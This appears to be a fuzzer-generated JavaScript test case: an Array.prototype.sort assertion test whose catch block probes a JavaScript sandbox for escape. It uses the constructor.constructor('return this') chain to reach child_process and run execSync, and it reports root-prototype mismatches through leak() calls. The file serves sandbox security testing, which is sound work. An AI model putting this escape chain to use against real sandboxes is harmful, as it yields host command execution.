try {
    const array = [
        undefined,
        'c',
        ,
        'b',
        undefined,
        ,
        'a',
        'd'
    ];
    Object.defineProperty(array, '2', {
        get() {
            let REPLACER = 23;
            return this.foo;
        },
        set(v) {
            throw () => {
                return () => {
                };
            };
            delete array[3];
            this.foo = v;
        }
    });
    array.sort();
    assert.sameValue(array[0], 'a');
    assert.sameValue(array[1], 'b');
    assert.sameValue(array[2], 'c');
    assert.sameValue(array[3], 'd');
    assert.sameValue(array[4], undefined);
    assert.sameValue(array[5], undefined);
    assert.sameValue(array[6], undefined);
    assert.sameValue('7' in array, false);
    assert.sameValue(array.hasOwnProperty('7'), false);
    assert.sameValue(array.length, 8);
    assert.sameValue(array.foo, 'c');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}